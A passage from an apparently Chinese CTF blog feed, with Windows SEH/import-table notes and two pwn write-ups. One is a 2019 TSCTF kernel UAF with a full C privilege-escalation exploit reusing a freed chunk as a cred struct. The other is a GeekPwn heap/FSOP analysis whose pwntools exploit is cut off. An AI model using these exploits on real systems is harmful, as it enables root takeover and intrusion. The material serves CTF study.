data-original="/2020/08/06/windows-pwn-huan-jing-da-jian-ji-chu-zhi-shi/1.png"></div><p>①线程信息块（TIB），永远放在fs段选择器指定的数据段的0偏移处，即fs:[0]的地方就是TIB结构。对不同的线程fs寄存器的内容有所有不同，但fs:[0]都是指向当前线程的TIB结构体，所以fs:[0]是一个EXCEPTION_REGISTRATION结构体的指针。<br>②当异常发生时，系统从fs:[0]指向的内存地址处取出ExceptionList字段，然后从ExceptionList字段指向的EXCEPTION_REGISTRATION结构中取出handler字段，并根据其中的地址去调用异常处理程序（回调函数）。</p><h5 id="2-2-2-3-5-SEH链及异常的传递"><a href="#2-2-2-3-5-SEH链及异常的传递" class="headerlink" title="2.2.2.3.5 SEH链及异常的传递"></a>2.2.2.3.5 SEH链及异常的传递</h5><p>通知调试器→SEH链→顶层异常处理→系统默认处理</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/windows-pwn-huan-jing-da-jian-ji-chu-zhi-shi/2.png"></div><p>（1）系统查看产生异常的进程是否被正在被调试，如果正在被调试，那么向调试器发送EXCEPTION_DEBUG_EVENT事件。<br>（2）如果进程没有没有被调试或者调试器不去处理这个异常，那么系统检查异常所处的线程并在这个线程环境中查看fs:[0]来确定是否安装SEH异常处理回调函数，如果有则调用它。<br>（3）回调函数尝试处理这个异常，如果可以正确处理的话，则修正错误并将返回值设置为ExceptionContinueExecution，这时系统将结束整个查找过程（4）如果回调函数返回ExceptionContinueSearch，相当于告诉系统它无法处理这个异常，系统将根据SEH链中的prev字段得到前一个回调函数地址并重复步骤3，直至链中的某个回调函数返回ExceptionContinueExection为止，查找结束。<br>（5）如果到了SEH链的尾部却没有一个回调函数愿意处理这个异常，那么系统会再被检查进程是否正在被调试，如果被调试的话，则再一次通知调试器。（6）如果调试器还是不去处理这个异常或进程没有被调试，那么系统检查有没有Final型的异常处理回调函数，如果有，就去调用它，当这个回调函数返回时，系统会根据这个函数的返回值做相应的动作。<br>（7）如果没有安装Final型回调函数，系统直接调用默认的异常处理程序终止进程，但在终止之前，系统再次调用发生异常的线程中的所有异常处理过程，目的是让线程异常处理过程获得最后清理未释放资源的机会，其后程序终止。</p><h5 id="2-2-2-3-6-异常处理流程及全局展开"><a href="#2-2-2-3-6-异常处理流程及全局展开" class="headerlink" title="2.2.2.3.6 异常处理流程及全局展开"></a>2.2.2.3.6 异常处理流程及全局展开</h5><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/windows-pwn-huan-jing-da-jian-ji-chu-zhi-shi/3.png"></div><h3 id="2-2-3-新机制–导入表和导出表"><a href="#2-2-3-新机制–导入表和导出表" class="headerlink" title="2.2.3 新机制–导入表和导出表"></a>2.2.3 新机制–导入表和导出表</h3><p>Windows程序没有延迟绑定机制自然也就没有PLT/GOT表，但是Windows程序显然也是要调用所谓的库函数的，<strong>Windows下的函数库是DLL文件，类似于Unix下的libc文件</strong>，程序调用库函数需要借助的就是导入表和导出表了。</p><p><strong>导入表是PE数据组织中的一个很重要的组成部分</strong>，它是为实现代码重用而设置的。通过分析导入表数据，可以获得诸如PE文件的指令中调用了多少外来函数，以及这些外来函数都存在于哪些动态链接库里等信息。<strong>Windows加载器在运行PE时会将导入表中声明的动态链接库一并加载到进程的地址空间，并修正指令代码中调用的函数地址。</strong>在数据目录中一共有四种类型的数据与导入表数据有关： 导入表、导入函数地址表、绑定导入表、延迟加载导入表。</p><p>程序中，<strong>导入表的地址通常位于.idata段</strong></p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/windows-pwn-huan-jing-da-jian-ji-chu-zhi-shi/4.png"></div><p>参考链接：</p><p><a href="https://www.cnblogs.com/yilang/p/11233935.html" target="_blank" rel="noopener">结构化异常SEH处理机制详细介绍</a><br><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/" target="_blank" rel="noopener">SCTF 2020 EasyWinHeap 入门 Windows Pwn</a><br><a href="https://binlep.github.io/2020/03/26/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Windows%20Pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">Windows Pwn 环境搭建</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Windows Pwn从入门到出门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Pwn </tag>
            
            <tag> 环境搭建 </tag>
            
            <tag> 知识整理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-TSCTF-babykernel</title>
      <link href="/2020/08/03/2019-tsctf-babykernel/"/>
      <url>/2020/08/03/2019-tsctf-babykernel/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题是2019-TSCTF的一道kernel题，出题人是17学长，拿过来假装是参加了2019 TSCTF的比赛。<br><a href="链接：https://pan.baidu.com/s/1aN4ub4Wr8vKc7Sy5TZYFqw">题目链接</a><br>提取码：12wp</p><h1 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h1><p>在windows中解压img文件，便可以得到里面的cpio文件。利用解压指令：</p><pre class="line-numbers language-bash"><code class="language-bash">cpio -idmv <span class="token operator">&lt;</span> rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>便可以得到文件，打包则是用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span><span class="token operator">|</span> cpio -o --format<span class="token operator">==</span>newc <span class="token operator">></span> rootfs,cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h1><p>可以看到kfree这里指针没有清空，可以double free和UAF</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/03/2019-tsctf-babykernel/0.png"></div>malloc func<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/03/2019-tsctf-babykernel/1.png"></div>分配0xD0大小的chunk并赋值。就没有别的什么有用的功能了<h1 id="0x03-漏洞分析-思路"><a href="#0x03-漏洞分析-思路" class="headerlink" title="0x03 漏洞分析+思路"></a>0x03 漏洞分析+思路</h1><p><strong>补充知识一：</strong><br>struct cred – 进程权限结构体若要达到提权权限，则需要修改权限信息。kernel是用cred结构体记录了线程的权限，每个线程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。<br>cred结构体源码如下:</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/03/2019-tsctf-babykernel/2.png"></div>只要将这个结构的uid~fsgid全部覆写为0就可以把这个线程权限提升为root（root uid为0）**补充知识二：**slab分配器的管理手段类似于 Glibc 中的 FastbinY。如果free链表内的chunk大小和该内核版本的 cred 结构体大小相同，那么会把free链表中的chunk解链返回给cred。**补充知识三：**我们使用fork来创建进程的时候，会使用prepare_cred来准备cred结构体。prepare_cred又会使用kmem_cache_alloc为其分配heap空间。<p>这样的话首先来调试一下，看看cred要分配多大的chunk：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/03/2019-tsctf-babykernel/3.png"></div><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/03/2019-tsctf-babykernel/4.png"></div>我们断在prepare_cred，调试发现fork进程的时候创建0xD0大小的chunk。这样的话，结合上面所述内容，我们就有如下思路了：<p>首先创建malloc一个chunk(即：malloc(chunk1))，删除（free(chunk1)），在进行fork(),此时就会分配这个chunk，那么我们再free(chunk1)，再malloc(chunk2)就可以初始化堆上的数据就可以让uid和gid为0</p><p>由于create操作中伴随着所在堆块数据的初始化，通过测试我们不用再有多余的操作便能将cred结构体uid及gid位置零。此时子进程就已成功提权（root）,那么直接执行system(“/bin/sh”)便可以getshell了。</p><h1 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h1><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ipc.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;memory.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pty.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>uint64_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_eflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>uint64_t <span class="token function">u64</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    uint64_t result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">7</span> <span class="token punctuation">;</span> i <span class="token operator">>=</span><span class="token number">0</span> <span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">0x00000000000000ff</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span>        <span class="token string">"movq %%cs, %0\n"</span>        <span class="token string">"movq %%ss, %1\n"</span>        <span class="token string">"movq %%rsp, %3\n"</span>        <span class="token string">"pushfq\n"</span>        <span class="token string">"popq %2\n"</span>        <span class="token punctuation">:</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_eflags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span>         <span class="token punctuation">:</span>         <span class="token punctuation">:</span> <span class="token string">"memory"</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">launch_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x271a</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x2766</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/tshop"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">create</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">delete</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">delete</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">create</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] fork error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] root now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> kernel从0到-1系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> kernel-UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 GeekPwn-babypwn</title>
      <link href="/2020/07/29/2020-geekpwn-babypwn/"/>
      <url>/2020/07/29/2020-geekpwn-babypwn/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h1><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/0.png"></div>保护全开就想到两个思路了：IO_FILE攻击和劫持hook了<h1 id="2-IDA分析"><a href="#2-IDA分析" class="headerlink" title="2.IDA分析"></a>2.IDA分析</h1><p>漏洞定位到create函数中的输入size的地方：</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/1.png"></div>如果size输入0，那么就会绕过判断，同时会分配0x20 size的chunk，但是继续看readInfo功能：<div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/2.png"></div>由于size是个有符号数，为0的话减一恒比无符号数大，那么就可以无限溢出了。有了堆溢出，就好办了。<h1 id="3-思路"><a href="#3-思路" class="headerlink" title="3.思路"></a>3.思路</h1><h2 id="3-1-思路一：劫持main-arena改top-chunk"><a href="#3-1-思路一：劫持main-arena改top-chunk" class="headerlink" title="3.1 思路一：劫持main_arena改top chunk"></a>3.1 思路一：劫持main_arena改top chunk</h2><p><strong>第一步</strong>：通过堆溢出改chunk size，释放掉产生unsorted bin，分配后造成chunk复用leak libc地址。<br><strong>第二步</strong>：利用堆溢出再劫持main arena地址，改top chunk的地址为malloc hook上面的一个地址，在修改的时候发现改top chunk只要保证有个size就行了（size大小没关系），只要不回收top chunk就不会页对齐等检查。<br><strong>第三步</strong>：改malloc hook为realloc hook+x，改realloc hook为one gadget来getshell<br>最后打通了发现程序禁了execve，只能执行system(“/bin/sh”)，交涉一番无果，只得考虑第二个思路FSOP</p><h2 id="3-2-思路二：FSOP"><a href="#3-2-思路二：FSOP" class="headerlink" title="3.2 思路二：FSOP"></a>3.2 思路二：FSOP</h2><p>首先利用之前的方法将libc和heap地址泄露，再利用unsorted bin attack将io_list_all改为main_arena地址（同时该main_arena地址偏移0x68也就是chain同时也是0x60 smallbin的地址要伪造一个file来满足getshell的条件（<strong>猜想：由于io_file_list_all先指向stderr，stderr的chain指向stdout，所以伪造的时候也要按照这个模式</strong>））。同时在对应的chunk位置伪造io_file，并在地址+0xd8的地方伪造vtable，vtable里面都是system函数。<br><strong>问题</strong>：（补充：不行的）<br>1.能不能io_file_list_all直接指向一个满足getshell条件的完整的fake file来getshell<br>2.能不能多次指向不完整的fake file，最后指向一个满足getshell条件的完整的fake file</p><p>原本的模式</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/3.png"></div><p>能不能下面两个格式：</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/4.png"></div><p>或：</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/5.png"></div><p>注意伪造结构体的时候需要满足：<br>mode&lt;=0；write_ptr &gt; write_base才会最后调用vtable的overflow虚函数。<br><strong>调用要求</strong>1.exit 2.执行流从main函数返回 3.malloc出错<br><strong>函数执行步骤</strong>：malloc_printerr -&gt;libc_message-&gt;__GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p><p><strong>由于在这个地方卡了好久，决定好好再写一写：最初的思路</strong><br>首先按照我的思路，需要一次unsorted bin攻击，还需要对应main_arena地址偏移0x68的chain处为一个file结构体。其对应的内容是0x60的smallbin。常规一个一个构造满足是无法完成的，至少我没有想到构造方法。因为unsorted bin攻击后就无法顺利释放chunk到unsorted bin中了，同时我们都知道想要smallbin的话是需要遍历查找unsorted bin没有满足才会将对应的0x60归入smallbin，但是我们注意到size大小是0x40以内，也就说明肯定会从0x60去切，注意一点（分配0x50的chunk会将该0x60chunk分配）</p><p><strong>接下来就是神来之笔了</strong>：<br>unsorted bin攻击并不是非要将该chunk分配，仅需要将其从双向链表中取出便可达到攻击效果。我们可以在最后利用分配chunk报错而实现这个目的，同时还可以改unsorted bin的size为0x60，不仅可以unsorted bin攻击成功归类的时候还可以产生我们需要的0x60的smallbin chunk。</p><hr><h3 id="最后神来之笔的源码解读"><a href="#最后神来之笔的源码解读" class="headerlink" title="最后神来之笔的源码解读"></a>最后神来之笔的源码解读</h3><p><strong>好了这下我们可以好好看看源码了</strong>：<br>调用int_malloc函数的时候最开始遍历fastbin，smallbin接下来是largebin，最后是unsorted bin。</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/6.png"></div><p>我们看到遍历unsorted bin的时候有这么一堆合法性检查，不通过就直接malloc_printerr了。在第一次执行前：里面的chunk大小是0x60，同时布置好了unsorted bin攻击，即bk改为io_file_list地址。</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/7.png"></div><p>接下来再看后面会执行什么：</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/8.png"></div><p>所以第一次会绕过合法性检查，成功的将0x60的chunk从unsorted bin取出放到smallbin中，这也就同时完成了创造0x60的smallbin和unsorted bin attack两个目的了，也就是一石二鸟了。</p><p>至于最后getshell是未能绕过检查直接进入malloc_printerr里面，进入__libc_message函数中</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/9.png"></div><p>在__libc_message函数中调用abort函数</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/10.png"></div><p>注意在该文件中将_IO_flush_all_lockp宏定义为fflush了</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/11.png"></div><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/12.png"></div><p>最后进入_IO_flush_all_lockp函数，看到通过一堆判断将执行overflow虚函数，第一个参数就是该file结构体的地址，所以当我们改为system的时候会将/bin/sh写在最前面</p><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/29/2020-geekpwn-babypwn/13.png"></div><h1 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h1><h2 id="4-1-exp-思路一-："><a href="#4-1-exp-思路一-：" class="headerlink" title="4.1 exp(思路一)："></a>4.1 exp(思路一)：</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"183.60.136.226"</span><span class="token punctuation">,</span><span class="token number">14823</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 0x45216 execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   rax == NULL</span><span class="token comment" spellcheck="true"># 0x4526a execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x30] == NULL</span><span class="token comment" spellcheck="true"># 0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x50] == NULL</span><span class="token comment" spellcheck="true"># 0xf1147 execve("/bin/sh", rsp+0x70, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x70] == NULL</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token 